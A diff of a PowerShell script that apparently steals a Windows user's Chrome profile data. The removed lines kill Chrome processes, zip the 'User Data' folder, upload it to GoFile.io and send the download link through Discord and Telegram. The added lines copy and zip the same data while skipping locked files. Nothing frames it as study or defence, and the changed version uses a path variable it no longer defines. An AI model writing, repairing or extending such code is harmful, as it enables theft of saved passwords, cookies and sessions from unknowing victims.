@@ -94,59 +94,40 @@ function Upload-FileAndGetLink {
     }
 }
 
-# Function to create a ZIP file using PowerShell's Compress-Archive
-function Zip-WithPowerShell {
-    param ([string]$sourceFolder, [string]$zipPath)
-
-    try {
-        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-
-        # Compress-Archive method (PowerShell native ZIP)
-        Compress-Archive -Path "$sourceFolder\*" -DestinationPath $zipPath -Force -ErrorAction Stop
-
-        if (-not (Test-Path $zipPath)) {
-            throw "ZIP file was not created successfully."
-        }
-
-        Add-Content -Path $logFile -Value "ZIP file created successfully: $zipPath"
-    } catch {
-        Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
-        Send-DiscordMessage -message "Failed to create ZIP file."
-        exit
-    }
-}
-
-# Define paths
-$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+# Create a zip of the Chrome User Data
 $outputZip = "$env:TEMP\chrome_data.zip"
 
-# Check if Chrome data exists
-if (-not (Test-Path $chromePath)) {
-    Send-DiscordMessage -message "Chrome User Data path not found!"
-    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
+try {
+    if (Test-Path $outputZip) {
+        Remove-Item $outputZip -Force
+    }
+
+    # Ensure all files can be copied before zipping
+    $tempFolder = "$env:TEMP\ChromeBackup"
+    if (Test-Path $tempFolder) {
+        Remove-Item -Recurse -Force $tempFolder
+    }
+
+    New-Item -ItemType Directory -Path $tempFolder | Out-Null
+
+    # Copy files while skipping those in use
+    Get-ChildItem -Path $chromePath -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+        $destination = $_.FullName -replace [regex]::Escape($chromePath), $tempFolder
+        if (-not (Test-Path $destination)) {
+            New-Item -ItemType Directory -Path (Split-Path -Parent $destination) -Force | Out-Null
+        }
+        try {
+            Copy-Item -Path $_.FullName -Destination $destination -ErrorAction Stop
+        } catch {
+            Add-Content -Path $logFile -Value "Skipped file (in use): $($_.FullName)"
+        }
+    }
+
+    # Zip the copied data
+    Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip -Force
+    Remove-Item -Recurse -Force $tempFolder
+} catch {
+    Send-DiscordMessage -message "Failed to create ZIP file."
+    Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
     exit
 }
-
-# Force kill ALL Chrome-related processes (to avoid file locks)
-Get-Process | Where-Object { $_.Name -match "chrome|google" } | Stop-Process -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 5
-
-# Use PowerShell native ZIP method
-Zip-WithPowerShell -sourceFolder $chromePath -zipPath $outputZip
-
-# Upload the file and get the link
-$link = Upload-FileAndGetLink -filePath $outputZip
-
-# Send the download link
-if ($link -ne $null) {
-    Send-DiscordMessage -message "Download link: $link"
-    Send-TelegramMessage -message "Download link: $link"
-    Add-Content -Path $logFile -Value "Download link sent: $link"
-} else {
-    Send-DiscordMessage -message "Failed to upload file to GoFile.io"
-    Add-Content -Path $logFile -Value "Failed to upload file to GoFile.io"
-}
-
-# Remove the zip file after uploading
-Remove-Item $outputZip -Force
-Add-Content -Path $logFile -Value "Deleted zip file after upload."
